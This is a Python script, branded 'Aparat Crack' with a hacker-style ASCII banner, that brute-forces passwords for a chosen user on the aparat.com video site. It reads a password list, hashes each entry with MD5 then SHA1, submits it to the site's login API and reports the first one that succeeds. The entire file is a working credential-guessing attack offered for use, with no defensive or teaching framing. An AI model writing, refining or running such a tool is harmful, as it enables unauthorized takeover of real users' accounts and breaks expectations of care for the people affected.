import os, sys
import hashlib
import json
import random

try:
    import requests
    from colorama import init
except:
    print('[!] installing libraries.')
    os.system('pip install -r requirements.txt')
    print('libraries were installed successfully.')
    sys.exit()

BLUE = '\033[34m'
GREEN = '\033[92m'
RED = '\033[31m'
YELLOW = "\033[33m"
LINK = "\033[94m"
RESET = "\033[0;0m"

init()

def banner():
    print(
RED+'''
          .AMMMMMMMMMMA.          
        .AV. :::.:.:.::MA.        
       A' :..        : .:`A       
      A'..              . `A.     
     A' :.    :::::::::  : :`A    
     M  .    :::.:.:.:::  . .M    
     M  :   ::.:.....::.:   .M    
     V : :.::.:........:.:  :V    
    A  A:    ..:...:...:.   A A   
   .V  MA:.....:M.::.::. .:AM.M   
  A'  .VMMMMMMMMM:.:AMMMMMMMV: A  
 :M .  .`VMMMMMMV.:A `VMMMMV .:M: 
  V.:.  ..`VMMMV.:AM..`VMV' .: V  
   V.  .:. .....:AMMA. . .:. .V   
    VMM...: ...:.MMMM.: .: MMV    
        `VM: . ..M.:M..:::M'      
          `M::. .:.... .::M       
           M:.  :. .... ..M       
           V:  M:. M. :M .V'''+GREEN+''' By BlackHacker'''+RED+'''
           `V.:M.. M. :M.V'''+LINK+''' https://github.com/Bl4ck-H4ck3r'''+RESET+
BLUE+'''

         █████╗ ██████╗  █████╗ ██████╗  █████╗ ████████╗
        ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
        ███████║██████╔╝███████║██████╔╝███████║   ██║   
        ██╔══██║██╔═══╝ ██╔══██║██╔══██╗██╔══██║   ██║   
        ██║  ██║██║     ██║  ██║██║  ██║██║  ██║   ██║   
        ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                         
            ██████╗██████╗  █████╗  ██████╗██╗  ██╗         
           ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝         
           ██║     ██████╔╝███████║██║     █████╔╝          
           ██║     ██╔══██╗██╔══██║██║     ██╔═██╗          
           ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗         
            ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
 '''+RESET)                       

def check_user(api, user):
    pass

def encrypt(password):
    md5 = hashlib.md5()
    md5.update(password.encode())
    password_md5 = md5.hexdigest()
    sha1 = hashlib.sha1()
    sha1.update(password_md5.encode())
    password_md5_sha1 = sha1.hexdigest()
    return password_md5_sha1

def connection(user, password):
    api = 'https://www.aparat.com/etc/api'
    password_enc = encrypt(password)
    res = requests.get(f'{api}/login/luser/{user}/lpass/{password_enc}')
    json_res_type = json.loads(res.content.decode('ascii'))
    json_res_login_type = json_res_type['login']['type']
    return json_res_login_type

def main():
    os.system('cls')
    banner()
    user = input(YELLOW+' username >>> '+RESET)
    p = input(YELLOW+' passlist (passwords.txt) >>> '+RESET)
    print()
    if p == '':
        passwords = open('passwords.txt', 'r').read().split('\n')
    else:
        try:
            passwords = open(p, 'r').read().split('\n')
        except:
            print(' Incorrect password list name !')
            sys.exit()
    for password in passwords:
        login_type = connection(user, password)
        if login_type == 'error':
            print(RED + ' [-] ' + user + ':' + password + RESET)
        else:
            print(GREEN + ' [+] ' + user + ':' + password + RESET)
            break

if __name__ == '__main__':
    main()
else:
    sys.exit()